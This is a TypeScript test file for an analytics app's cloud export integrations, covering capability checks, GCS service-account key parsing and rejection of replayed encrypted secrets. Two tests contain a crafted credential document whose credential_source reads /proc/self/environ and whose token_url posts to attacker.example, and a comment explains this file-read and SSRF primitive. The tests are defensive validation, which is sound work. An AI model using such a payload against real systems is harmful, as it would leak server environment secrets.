import { describe, expect, it } from 'vitest';
import {
  isKind,
  parseServiceAccountKey,
  zGCSExportConfig,
  zS3ExportConfig,
} from './integrations';

describe('isKind', () => {
  it('matches a declared capability', () => {
    expect(isKind({ type: 's3_export' }, 'export')).toBe(true);
    expect(isKind({ type: 'gcs_export' }, 'export')).toBe(true);
    expect(isKind({ type: 'slack' }, 'notification')).toBe(true);
    expect(isKind({ type: 'webhook' }, 'notification')).toBe(true);
  });

  it('returns false for a capability the integration does not have', () => {
    expect(isKind({ type: 's3_export' }, 'notification')).toBe(false);
    expect(isKind({ type: 'slack' }, 'export')).toBe(false);
  });

  it('is lenient for empty/unknown config (does not throw)', () => {
    // A Slack integration before its OAuth callback has config {} with no type;
    // the export cron filters over every integration, so this must not throw.
    expect(isKind({}, 'export')).toBe(false);
    expect(isKind({ type: undefined }, 'export')).toBe(false);
    expect(isKind({ type: 'something-unknown' }, 'export')).toBe(false);
  });
});

const SERVICE_ACCOUNT = JSON.stringify({
  type: 'service_account',
  project_id: 'openpanel-test',
  client_email: 'exporter@openpanel-test.iam.gserviceaccount.com',
  private_key: '-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n',
});

describe('parseServiceAccountKey', () => {
  it('accepts a service_account document and returns only allowlisted fields', () => {
    const result = parseServiceAccountKey(SERVICE_ACCOUNT);
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    expect(result.credentials.project_id).toBe('openpanel-test');
    expect(result.credentials.client_email).toBe(
      'exporter@openpanel-test.iam.gserviceaccount.com',
    );
  });

  it('drops unknown fields rather than passing them through to the SDK', () => {
    const result = parseServiceAccountKey(
      JSON.stringify({
        ...JSON.parse(SERVICE_ACCOUNT),
        credential_source: { file: '/proc/self/environ' },
        token_url: 'https://attacker.example/collect',
      }),
    );
    expect(result.ok).toBe(true);
    if (!result.ok) {
      return;
    }
    expect(result.credentials).not.toHaveProperty('credential_source');
    expect(result.credentials).not.toHaveProperty('token_url');
  });

  it('rejects external_account documents (file-read / SSRF primitive)', () => {
    // google-auth-library dispatches on `type`; external_account would route to
    // ExternalAccountClient, whose credential_source reads arbitrary local files
    // or issues arbitrary requests and POSTs the result to token_url.
    const result = parseServiceAccountKey(
      JSON.stringify({
        type: 'external_account',
        audience: '//iam.googleapis.com/projects/1/x',
        subject_token_type: 'urn:ietf:params:oauth:token-type:jwt',
        token_url: 'https://attacker.example/collect',
        credential_source: { file: '/proc/self/environ' },
      }),
    );
    expect(result.ok).toBe(false);
    if (result.ok) {
      return;
    }
    expect(result.error).toContain('external_account');
  });

  it('rejects the other GoogleAuth credential types', () => {
    for (const type of [
      'authorized_user',
      'impersonated_service_account',
      'external_account_authorized_user',
    ]) {
      expect(parseServiceAccountKey(JSON.stringify({ type })).ok).toBe(false);
    }
  });

  it('rejects malformed and incomplete documents', () => {
    expect(parseServiceAccountKey('not json').ok).toBe(false);
    expect(parseServiceAccountKey('[]').ok).toBe(false);
    expect(parseServiceAccountKey('"a string"').ok).toBe(false);
    expect(
      parseServiceAccountKey(
        JSON.stringify({ type: 'service_account', project_id: 'p' }),
      ).ok,
    ).toBe(false);
  });
});

describe('write-only secrets', () => {
  const base = {
    type: 'gcs_export' as const,
    bucket: 'b',
    prefix: 'p',
    format: 'jsonl_gzip' as const,
  };

  it('rejects an already-encrypted value being replayed as a credential', () => {
    const parsed = zGCSExportConfig.safeParse({
      ...base,
      serviceAccountKey: 'enc:c29tZS1jaXBoZXJ0ZXh0',
    });
    expect(parsed.success).toBe(false);
  });

  it('allows a blank credential (means "keep the stored one" on update)', () => {
    expect(
      zGCSExportConfig.safeParse({ ...base, serviceAccountKey: '' }).success,
    ).toBe(true);
  });

  it('rejects a non-service-account credential document', () => {
    expect(
      zGCSExportConfig.safeParse({
        ...base,
        serviceAccountKey: JSON.stringify({ type: 'external_account' }),
      }).success,
    ).toBe(false);
  });

  it('rejects a replayed S3 secret access key', () => {
    expect(
      zS3ExportConfig.safeParse({
        type: 's3_export',
        bucket: 'b',
        prefix: 'p',
        region: 'us-east-1',
        format: 'jsonl_gzip',
        encryption: 'SSE-S3',
        authMode: 'access_key',
        accessKeyId: 'AKIA',
        secretAccessKey: 'enc:c29tZS1jaXBoZXJ0ZXh0',
      }).success,
    ).toBe(false);
  });
});
